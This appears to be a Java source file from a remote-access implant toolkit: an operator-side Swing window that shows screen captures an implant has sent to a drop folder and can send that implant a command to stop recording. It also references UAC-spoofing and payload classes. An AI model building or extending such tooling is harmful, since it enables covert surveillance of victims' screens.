/**
 * This class displays a Frame with Tabs representing the captured screen provided at the location specified by the user
 * 
 * 
 * @author Solomon Sonya
 */


package Implant.Payloads;

import Implant.Driver;

import Controller.Drivers.*;
import Controller.Thread.*;
import Implant.*;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Receiver;
import Implant.Payloads.Frame_SpoofUAC;
import Implant.Payloads.MapSystemProperties;
import Implant.Payloads.Worker_Thread_Payloads;


import java.awt.Frame;

import javax.imageio.ImageIO;
import javax.swing.JFrame;
import java.awt.Dimension;
import javax.swing.*;
import java.lang.*;
import java.awt.Frame;
import javax.swing.border.*;

import java.awt.*;

import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.SwingConstants;
import java.awt.Rectangle;
import java.awt.BorderLayout;
import javax.swing.JLabel ;
import java.lang.*;
import java.awt.Label;
import java.awt.event.KeyEvent;
import java.awt.Panel;
import java.awt.SystemColor;
import javax.swing.JRadioButton;
import java.text.*;
import java.util.*;
import java.awt.Font;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import javax.swing.JPanel;
import javax.swing.JSlider;
import java.awt.event.*;
import java.awt.Point;
import javax.swing.BorderFactory;
import javax.swing.border.EtchedBorder;
import javax.swing.border.TitledBorder;
import java.awt.ScrollPane;
import javax.swing.border.BevelBorder;
import javax.swing.border.SoftBevelBorder;
import javax.swing.text.DefaultStyledDocument;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import javax.swing.text.StyledDocument;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import java.awt.Button;
import javax.swing.JButton;
import javax.swing.JTextField;
import java.awt.Choice;
import javax.swing.JComboBox;
import java.net.*;
import javax.swing.WindowConstants;
import javax.swing.table.*;
import java.lang.*;

import java.io.*;
import java.awt.GridBagLayout;

public class Frame_Render_Captured_Screen extends JFrame implements ActionListener
{
	public static final String strMyClassName = "Render_Captured_Screen";
	
	JPanel jpnlHeading = new JPanel(new BorderLayout());
	JLabel jlblHeading = new JLabel("SCREEN SCRAPE", JLabel.CENTER);
		JPanel jpnlRefreshTimes = new JPanel();
			JLabel jlblRefreshTime = new JLabel("Refresh Time: UKN" );
			JLabel jlblRefreshRate = new JLabel("Refresh Rate: UKN" );
	
	JPanel jpnlTabs = new JPanel(new GridLayout(1,1));
		JTabbedPane tabbedPane_Main  = new JTabbedPane(JTabbedPane.TOP);
		
	JPanel jpnlRenderOptions = new JPanel(new BorderLayout());
		JPanel jpnlButton_South = new JPanel();
		JButton jbtnSetRenderDirectory = new JButton("Set Render Directory");
		JLabel jlblRenderDirectory = new JLabel("Set Render Driectory");
	
	public static final String SCREEN_TITLE = "Screen Scrape [";
	
	public boolean deleteFileAfterRender = false;
	
	public File diretoryToScan = null;
	
	public Worker_Thread_Payloads myWorkerThread = null;
	public Thread_Terminal myTerminal = null; 
	
	long myLastConnectionTime_millis = 0;
	String interval = "0:00";
	
	Worker_Thread_Payloads parent_worker_thread = null;
	
	public Frame_Render_Captured_Screen(String title, File directoryLocationToScan, boolean delAfterRender, Worker_Thread_Payloads workerPar) 
	{
		try
		{
			deleteFileAfterRender = delAfterRender;
			parent_worker_thread = workerPar;
			
			diretoryToScan = directoryLocationToScan;
			
			this.setBounds(60, 100, 600, 500);			
			this.setLayout(new BorderLayout());
			
			this.jlblHeading.setText(title);
			
			jlblHeading.setForeground(Color.blue.darker());
			jlblHeading.setFont(new Font("Courier", Font.BOLD, 18));
			jpnlHeading.add(BorderLayout.NORTH, jlblHeading);
			
			this.jlblRefreshRate.setFont(new Font("Courier", Font.BOLD, 16));
			this.jlblRefreshTime.setFont(new Font("Courier", Font.BOLD, 16));
			
			jpnlRefreshTimes.add(jlblRefreshTime);
			jpnlRefreshTimes.add(jlblRefreshRate);
			jlblRefreshRate.setVisible(false);
			
			jpnlHeading.add(BorderLayout.SOUTH, jpnlRefreshTimes);
			this.add(BorderLayout.NORTH, this.jpnlHeading);
			
			this.add(BorderLayout.CENTER, jpnlTabs);
			jpnlTabs.add(tabbedPane_Main);
			
			
			jpnlButton_South.add(jbtnSetRenderDirectory);
			jpnlRenderOptions.add(BorderLayout.WEST, jpnlButton_South);
			jpnlRenderOptions.add(BorderLayout.CENTER, jlblRenderDirectory);
			this.add(BorderLayout.SOUTH, jpnlRenderOptions);
			jbtnSetRenderDirectory.addActionListener(this);
			
			
			Drivers.setJFrameIcon(this);
			setTitle(Driver.TITLE);
			
			
			
			Driver.sop("\nRendering Screen Captures in Directory: " + directoryLocationToScan + "\n");
			
			if(directoryLocationToScan != null)
			{
				this.jlblRenderDirectory.setText("Scrape DropBox: "  + directoryLocationToScan.getCanonicalPath());
			}
			
			myLastConnectionTime_millis = Driver.getTime_Current_Millis();
			
			this.scanDirectory(diretoryToScan);
			
			//tabbedPane_Main.addTab("Test one!", new JPanel());
			//tabbedPane_Main.addTab("Test two!", new JPanel());
			//tabbedPane_Main.addTab("Test thress!", new JPanel_RenderedScreen(new File("C:\\Users\\Qoheleth\\Desktop\\FTP\\192.168.137.1_9000\\SCREEN CAPTURE\\1380594500137_1_record.png")));
			
			//this.jlblRefreshTime.setIcon(new ImageIcon("C:\\Users\\Qoheleth\\Desktop\\FTP\\192.168.137.1_9000\\SCREEN CAPTURE\\1380594500137_1_record.png"));
			
			this.addWindowListener(new java.awt.event.WindowAdapter() 
			{
				public void windowClosing(java.awt.event.WindowEvent e) 
				{
					closeFrame(); 			
				}
			});
			
			this.validate();
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", strMyClassName, e, "", false);
		}
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == jbtnSetRenderDirectory)
			{
				File selectedFile = Driver.querySelectFile(false, "Please Select Directory to render captured files", JFileChooser.DIRECTORIES_ONLY, false, false);
				
				if(selectedFile != null)
				{
					diretoryToScan = selectedFile;
					this.jlblRenderDirectory.setText("Scrape DropBox: "  + diretoryToScan.getCanonicalPath());
					
					if(parent_worker_thread != null)
					{
						parent_worker_thread.fleRenderDirectory = diretoryToScan;
					}
				}
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("ae", strMyClassName, e, "", false);
		}
	}
	
	public boolean closeFrame()
	{
		try
		{
			if(this.myWorkerThread != null)
			{
				this.myWorkerThread.killThisThread = true;				
			}
			
			//send the implant to stop sending screen captures if applicable
			if(myTerminal != null)
			{
				//we have a good terminal, send it the kill command to stop screen scrape
				Drivers.appendCommandTerminalStatusMessage("Terminal connected, sending Screen Scrape kill command now...");
				myTerminal.sendCommand_RAW(Driver.DISABLE_RECORD_SCREEN);
			}
			
			System.gc();
			this.dispose();
		}
		catch(Exception e)
		{
			Drivers.eop("closeFrame", strMyClassName, e, e.getLocalizedMessage(), false);			
		}
		
		return false;//should have been unreachable!
	}
	
	public boolean scanDirectory(File fleDirectoryToScan)
	{
		try
		{
			if(fleDirectoryToScan == null || !fleDirectoryToScan.exists() || !fleDirectoryToScan.isDirectory())
			{
				return false;
			}
			
			//otherwise, scan the given directory and check if it ends in "X_record.png" etc. this is indicative of our screen captures
			
			//scan the directory for matching files saved
			ArrayList<File> allImages = Driver.getFilesUnderSelectedDirectory(fleDirectoryToScan, new String [] {Driver.CAPTURE_SCREEN_FILE_EXTENSION_WITHOUT_DOT});
			
			if(allImages == null || allImages.size() < 1)
			{
				//no images to render
				return false;
			}
			
			
			
			//else, dwindle the images a bit further and only keep the ones that match our extension profile
			ArrayList<File> imagesToRender = new ArrayList<File>();
			imagesToRender = allImages;
			/*File fle = null;
			for(int i = 0; i < allImages.size(); i++)
			{
				fle = allImages.get(i);
				
				if(fle.getCanonicalPath().trim().endsWith("_record." + Driver.CAPTURE_SCREEN_FILE_EXTENSION_WITHOUT_DOT))
				{
					imagesToRender.add(fle);
				}
			}
				*/
			
			if(imagesToRender == null || imagesToRender.size() < 1)
			{
				//no images to render
				return false;
			}
			
			
			File fleImage = null;
			JPanel_RenderedScreen renderedScreenObject = null;
			String strToCheck = "";
			
			
			//check each file if it matches our expected ending, if so, add it to the jtab
			for(int i = 0; i < imagesToRender.size(); i++)
			{
				fleImage = imagesToRender.get(i);
				
				if(fleImage == null || !fleImage.exists() || !fleImage.isFile())
				{
					continue;
				}
				
				//attempt to sort the arraylist
				//try	{	Collections.sort(imagesToRender, new FileComparator());	}	catch(Exception e){}
				
				//now need to check each image if it ends in 0, 1, 2, ... _n_record.png
				for(int j = 0; j < imagesToRender.size(); j++)
				{
					try
					{
						//else, we have a good file, test it's extension
						if(fleImage.getCanonicalPath().trim().endsWith("_" + j + "_" + "record" + "." + Driver.CAPTURE_SCREEN_FILE_EXTENSION_WITHOUT_DOT))
						{
							//Driver.sop("== Attempting to render: " + fleImage.getCanonicalPath());
																					
							//find the jtab with this title
							int indexToModify = this.tabbedPane_Main.indexOfTab(SCREEN_TITLE + j + "]");
							
							//Driver.sop("indexToModify: " + indexToModify);
							
							if(indexToModify < 0)
							{
								//no tab was found, so create a new one
								
								if(fleImage == null || !fleImage.isFile() || fleImage.length() < 1)
								{
									continue;
								}
								
								//renderedScreenObject.removeAll();
								//get the rendered object image
								renderedScreenObject = new JPanel_RenderedScreen(fleImage);
								
								tabbedPane_Main.addTab(SCREEN_TITLE + j + "]", renderedScreenObject);
							}
							else //modify the current tab
							{
								JPanel_RenderedScreen currTab = (JPanel_RenderedScreen)tabbedPane_Main.getComponent(indexToModify);
								currTab.setImage(fleImage);
							}
							
							System.gc();
							
							if(deleteFileAfterRender)
							{
								try	{	fleImage.delete();	} catch(Exception e){Driver.sop("Could not delete file: " + fleImage.getCanonicalPath());}
							}
						}
						
						//
						//Update Refresh times
						//
						if(j == 0)
						{
							interval = Driver.getTimeInterval(Driver.getTime_Current_Millis(), myLastConnectionTime_millis);
							myLastConnectionTime_millis = Driver.getTime_Current_Millis();
							
							this.jlblRefreshTime.setText("Last Refresh Time: " + Driver.getTimeStamp_Without_Date());
							//this.jlblRefreshRate.setText("   Refresh Interval: " + interval);
						}
						
					}
					
					catch(Exception e)
					{
						continue;
					}
					
					
				}
				
				
			}
			
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("scanDirectory", strMyClassName, e, "", true);
		}
		
		return false;
	}
	

}
